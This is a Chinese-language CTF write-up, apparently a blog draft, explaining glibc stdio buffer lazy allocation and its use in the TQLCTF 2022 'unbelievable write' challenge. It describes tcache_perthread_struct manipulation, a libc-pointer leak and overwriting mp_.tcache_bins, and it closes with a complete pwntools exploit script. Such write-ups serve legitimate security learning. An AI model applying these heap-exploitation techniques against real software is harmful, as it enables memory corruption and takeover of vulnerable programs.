---
title: "libc_stdio_buffer初始化"
slug: libc-stdio-buffer
description: "利用 stdio 缓冲区延迟分配与 tcache_perthread_struct 操纵，实现任意地址写并泄露 libc，最终改写 mp_.tcache_bins 完成利用。"
date: 2026-09-16
author: mixt
category: IO_FILE
tags: [libc_stdio_buffer，tcache_perthread_struct，mp_]
featured: false
draft: true
---
# libc_stdio_buffer初始化 

> 关键词：`libc stdio buffer`、`_IO_file_doallocate`、`arbitrary free`、`tcache_perthread_struct`、`mp_.tcache_bins`

---

## 一、stdio 缓冲区的延迟分配

程序刚启动时，`stdout` / `stderr` / `stdin` 三个流的缓冲区 `_IO_buf_base` 均为 `NULL`。

只有**第一次**对该流进行读写时（例如调用 `puts`），才会触发下面的逻辑：

```c
if (fp->_IO_buf_base == NULL)
    _IO_file_doallocate(fp);
```

在 `_IO_file_doallocate` 内部，会执行如下操作：

```c
size = _IO_BUFSIZ;              // 一般为 0x1000
p = malloc(size);
fp->_IO_buf_base = p;
fp->_IO_buf_end  = p + size;
```

随后，`puts("...")` 会把字符串复制进这块刚申请出来的缓冲区。

> **如果我们能控制 `malloc(size)` 的返回值，让它返回我们精心挑选的地址 `Target`，那么 `Target` 处就会被写入 `puts` 的参数。**

---

## 二、例: [TQLCTF 2022] unbelievable write

![c2 的任意地址释放](/images/mixt/c3d97da6b99988dab7c595230e56da36.png)
本题的漏洞类型如上图所示，其中最关键的是一处 **c2 的任意地址释放**：

![修改 target 内容以获取 flag](/images/mixt/9784b1d3dabe6008127a69d875a75d8d.png)

只要能成功改写 `target` 处的内容，就能顺利拿到 flag：

![c1 在使用完 chunk 之后会立即将其释放](/images/mixt/3d38d8ce3b70deaff2d6240741c498a6.png)

c1 在使用完 chunk 之后会立即将其释放
这导致我在了解 `libc_stdio_buffer`（stdio 缓冲区分配机制）之前的多次尝试全部失败，即使把 chunk 申请到了 `target` 附近，程序也会因为无法通过 `free` 的合法性检查而直接崩溃。

---

## 三、利用思路

1. **借助 c2 释放掉 `tcache_perthread_struct`**，再把它申请回来，同时将该处 0x280 对应的 `count` 改写为 8。这样一来，再次释放它时它就会绕过 tcache、直接进入 **unsorted bin**。

2. **对这块 chunk 进行切割**（提前布置好切割出来的chunk对应 bin 的 `count`），随后再将其合并。切割之后会在 `tcache_perthread_struct` 上残留 libc 指针：

3. **修改对应的 `count`，并准备好 0x1010 的 `count`**，然后通过**字节爆破（成功率约 1/16）**把分配落到 `mp_` 区域附近：

   ![bins 状态](/images/mixt/bins.png)

4. **修改 `mp_.tcache_bins`**，把 `tcache_bins` 阈值抬高，使得 **0x1010 大小的 chunk 也被当作 tcache chunk** 处理。之后再次进入 c3，便能看到 `target` 被成功改写：

   ![命中 mp_ 区域](/images/mixt/mp_.png)

   ![target 被成功修改](/images/mixt/target.png)

---

## 四、Exploit

```python
from pwn import *

io = process(b'./pwn_patched', stdout=PIPE)
# io = remote(b'node4.anna.nssctf.cn', 24574)
libc = ELF(b'./libc.so.6')
# io = remote(b'node4.anna.nssctf.cn', 22516)
# target 0xFEDCBA9876543210 0x404080


def cmd(choice):
    io.sendlineafter(b'>', str(choice).encode())


def add_chunk(size, content=b'a'):
    cmd(1)
    io.sendline(str(size).encode())
    io.send(content)


def delete_chunk(content):
    cmd(2)
    io.sendline(content)


def tcache_count(idx):
    res = [b'\x00\x00' for _ in range(64)]  # 0x290 - 0x20 = 39
    for t in idx:
        res[(t - 0x20) // 0x10] = b'\x08\x00'
    return b''.join(res)


add_chunk(0x9f0, p64(0x404078) * (0x9f0 // 8))
delete_chunk(b'-656')
add_chunk(0x280, tcache_count([0x290]) + b'\n')
add_chunk(0x260, tcache_count([0x270]) + b'\n')
add_chunk(0x280, tcache_count([0x290, 0x400, 0x410]) + b'\x01\x00' * 4 * ((0x400 - 0x20) // 0x10) + b'\x90\xe2' + b'\n')
mp_ = libc.symbols['mp_']
log.success(f'{hex(mp_)}')
payload = p64(0x20000) + p64(0x8) + p64(0) + p64(0x10000) + p64(0) * 3 + p64(0x1301000) + p64(0xffffffffffffffff) + b'\n'
gdb.attach(io)
add_chunk(0x3f0, payload)
cmd(3)
cmd(3)
io.interactive()
```












